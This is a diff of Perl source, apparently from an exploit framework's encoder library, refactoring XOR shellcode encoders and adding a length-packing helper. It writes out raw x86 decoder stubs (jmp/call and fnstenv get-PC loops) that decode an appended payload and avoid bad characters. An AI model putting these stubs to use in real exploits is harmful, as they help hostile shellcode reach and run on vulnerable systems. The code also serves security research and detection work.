@@ -71,7 +71,7 @@ sub EncodeFnstenv
     }
     
     my $xordat = XorDword($xorkey, $rawshell);
-    my $encode = XorDecoderDwordFnstenv("x86", $xorkey, length($xordat));
+    my $encode = XorDecoderDwordFnstenv($xorkey, length($xordat));
 
     my $shellcode = $encode . $xordat;
 
@@ -267,112 +267,107 @@ sub XorDecoderDword {
             $xorlen = substr($xorlen, 0, 1);
         }
 
-# hdm's old encoder
-#        my $decoder =
-#            "\xeb\x19".                     # jmp 804809b <xor_end>
-#            "\x5e".                         # pop %esi
-#            "\x31\xc9".                     # xor %ecx,%ecx
-#            "\x81\xe9". $xorlen .           # sub -xorlen,%ecx
-#            "\x81\x36". $xorkey .           # xorl xorkey,(%esi)
-#            "\x81\xee\xfc\xff\xff\xff".     # sub $0xfffffffc,%esi (add esi, 0x04)
-#            "\xe2\xf2".                     # loop 804808b <xor_xor>
-#            "\xeb\x05".                     # jmp 80480a0 <xor_don>
-#            "\xe8\xe2\xff\xff\xff";         # call 8048082 <xor_beg>
 
-# spoon's smaller variable-length encoder
-        my $decoder;
-        if($smallVersion) {
-            # 26 bytes
-            $decoder =
-                "\xeb\x13".                   # jmp SHORT 0x15 (xor_end)
-                "\x5e".                       # xor_begin: pop esi
-                "\x31\xc9".                   # xor ecx,ecx
-                "\x83\xe9". $xorlen .         # sub ecx, BYTE -xorlen
-                "\x81\x36". $xorkey .         # xor_xor: xor DWORD [esi],xorkey
-                "\x83\xee\xfc".               # sub $esi,-4
-                "\xe2\xf5".                   # loop 0x8 (xor_xor)
-                "\xeb\x05".                   # jmp SHORT 0x1a (xor_done)
-                "\xe8\xe8\xff\xff\xff";       # xor_end: call 0x2 (xor_begin)
-                                              # xor_done:
-        }
-        else {
-            # 29 bytes
-            $decoder =
-                "\xeb\x16".                   # jmp SHORT 0x18 (xor_end)
-                "\x5e".                       # xor_begin: pop esi
-                "\x31\xc9".                   # xor ecx,ecx
-                "\x81\xe9". $xorlen .         # sub ecx, -xorlen
-                "\x81\x36". $xorkey .         # xor_xor: xor DWORD [esi],xorkey
-                "\x83\xee\xfc".               # sub $esi,-4
-                "\xe2\xf5".                   # loop 0xb (xor_xor)
-                "\xeb\x05".                   # jmp SHORT 0x1d (xor_done)
-                "\xe8\xe5\xff\xff\xff";       # xor_end: call 0x2 (xor_begin)
-                                              # xor_done:
-        }
 
-        return $decoder;
-    }
-
-    return;
+  # spoon's smaller variable-length encoder
+  my $decoder;
+  if($smallVersion) {
+    # 26 bytes
+    $decoder =
+      "\xeb\x13".                   # jmp SHORT 0x15 (xor_end)
+      "\x5e".                       # xor_begin: pop esi
+      "\x31\xc9".                   # xor ecx,ecx
+      "\x83\xe9". $xorlen .         # sub ecx, BYTE -xorlen
+      "\x81\x36". $xorkey .         # xor_xor: xor DWORD [esi],xorkey
+      "\x83\xee\xfc".               # sub $esi,-4
+      "\xe2\xf5".                   # loop 0x8 (xor_xor)
+      "\xeb\x05".                   # jmp SHORT 0x1a (xor_done)
+      "\xe8\xe8\xff\xff\xff";       # xor_end: call 0x2 (xor_begin)
+                                    # xor_done:
+  }
+  else {
+    # 29 bytes
+    $decoder =
+      "\xeb\x16".                   # jmp SHORT 0x18 (xor_end)
+      "\x5e".                       # xor_begin: pop esi
+      "\x31\xc9".                   # xor ecx,ecx
+      "\x81\xe9". $xorlen .         # sub ecx, -xorlen
+      "\x81\x36". $xorkey .         # xor_xor: xor DWORD [esi],xorkey
+      "\x83\xee\xfc".               # sub $esi,-4
+      "\xe2\xf5".                   # loop 0xb (xor_xor)
+      "\xeb\x05".                   # jmp SHORT 0x1d (xor_done)
+      "\xe8\xe5\xff\xff\xff";       # xor_end: call 0x2 (xor_begin)
+                                    # xor_done:
+  }
+    # hdm's old encoder
+    #        my $decoder =
+    #            "\xeb\x19".                     # jmp 804809b <xor_end>
+    #            "\x5e".                         # pop %esi
+    #            "\x31\xc9".                     # xor %ecx,%ecx
+    #            "\x81\xe9". $xorlen .           # sub -xorlen,%ecx
+    #            "\x81\x36". $xorkey .           # xorl xorkey,(%esi)
+    #            "\x81\xee\xfc\xff\xff\xff".     # sub $0xfffffffc,%esi (add esi, 0x04)
+    #            "\xe2\xf2".                     # loop 804808b <xor_xor>
+    #            "\xeb\x05".                     # jmp 80480a0 <xor_don>
+    #            "\xe8\xe2\xff\xff\xff";         # call 8048082 <xor_beg>
+  return $decoder;
 }
 
 # w00t http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0096.html
 # This is useful if you have a BadChar of say 0xff, and your payload is small (or insanely large)
 # enough to not have 0xff in your payload, which is realistic (<= 512 && > 4)
 sub XorDecoderDwordFnstenv {
-    my ($arch, $xor, $len) = @_;
-    if(! $len) { $len = 0x200 }
+  my $xorkey = pack('L', shift());
+  my $l = PackLength(shift());
 
-    # this xor decoder was written by spoonm <ninjatools [at] hush.com>
-    if (lc($arch) eq "x86")
-    {
-	my $smallVersion = 0;
-        # Pad to a 4 byte boundary, the xor data should already be padded
-        # but just incase.
-        my $loopCounter = int(($len - 1) / 4) + 1;
-        $loopCounter *= -1;
 
-        my $xorlen = pack("L", $loopCounter);
-        my $xorkey = pack("L", $xor);
+  # spoon's smaller variable-length fnstenv encoder
+  my $decoder;
+  if($l->{'negSmall'}) {
+    # 24 bytes
+    $decoder =
+      "\xd9\xee".                         # fldz
+      "\xd9\x74\x24\xf4".                 # fnstenv [esp - 12]
+      "\x5b".                             # pop ebx
+      "\x31\xc9".                         # xor ecx,ecx
+      "\x83\xe9". $l->{'negLengthByte'} . # sub ecx, BYTE -xorlen
+      "\x81\x73\x18". $xorkey .           # xor_xor: xor DWORD [ebx + 24], xorkey
+      "\x83\xeb\xfc".                     # sub ebx,-4
+      "\xe2\xf4"                          # loop xor_xor
+  }
+  else {
+    # 27 bytes
+    $decoder =
+      "\xd9\xee".                         # fldz
+      "\xd9\x74\x24\xf4".                 # fnstenv [esp - 12]
+      "\x5b".                             # pop ebx
+      "\x31\xc9".                         # xor ecx,ecx
+      "\x81\xe9". $l->{'negLength'} .     # sub ecx, BYTE -xorlen
+      "\x81\x73\x1b". $xorkey .           # xor_xor: xor DWORD [ebx + 27], xorkey
+      "\x83\xeb\xfc".                     # sub ebx,-4
+      "\xe2\xf4"                          # loop xor_xor
+  }
+  return $decoder;
+}
 
-        # If encoded data is small enough, use the single byte sub version
-        if($loopCounter >= -128) {
-            $smallVersion = 1;
-            $xorlen = substr($xorlen, 0, 1);
-        }
+sub PackLength {
+  my $len = shift;
+  my $data = { 'small' => 0 };
 
-# spoon's smaller variable-length encoder
-        my $decoder;
-        if($smallVersion) {
-            # 24 bytes
-            $decoder =
-                "\xd9\xee".                   # fldz
-                "\xd9\x74\x24\xf4".           # fnstenv [esp - 12]
-                "\x5b".                       # pop ebx
-                "\x31\xc9".                   # xor ecx,ecx
-                "\x83\xe9". $xorlen .         # sub ecx, BYTE -xorlen
-                "\x81\x73\x18". $xorkey .     # xor_xor: xor DWORD [ebx],xorkey
-                "\x83\xeb\xfc".               # sub ebx,-4
-                "\xe2\xf4"                    # loop xor_xor
-        }
-        else {
-            # 29 bytes
-            $decoder =
-                "\xd9\xee".                   # fldz
-                "\xd9\x74\x24\xf4".           # fnstenv [esp - 12]
-                "\x5b".                       # pop ebx
-                "\x83\xc3\x1d".               # add ebx, BYTE 29
-                "\x31\xc9".                   # xor ecx,ecx
-                "\x81\xe9". $xorlen .         # sub ecx, BYTE -xorlen
-                "\x81\x33". $xorkey .         # xor_xor: xor DWORD [ebx],xorkey
-                "\x83\xeb\xfc".               # sub ebx,-4
-                "\xe2\xf5"                    # loop xor_xor
-        }
+  # Pad to a 4 byte boundary
+  my $loopCounter = int(($len - 1) / 4) + 1;
 
-        return $decoder;
-    }
+  $data->{'padLength'} = $loopCounter;
+  $data->{'negPadLength'} = -1 * $loopCounter;
+  $data->{'length'} = pack('L', $data->{'padLength'});
+  $data->{'negLength'} = pack('L', $data->{'negPadLength'});
 
-    return;
+  $data->{'negSmall'} = 1 if($data->{'negPadLength'} >= -128);
+  $data->{'small'}    = 1 if($data->{'padLength'} <= 127);
+  $data->{'lengthByte'} = substr($data->{'length'}, 0, 1);
+  $data->{'negLengthByte'} = substr($data->{'negLength'}, 0, 1);
+
+  return($data);
 }
 
 sub XorDecoderWord {
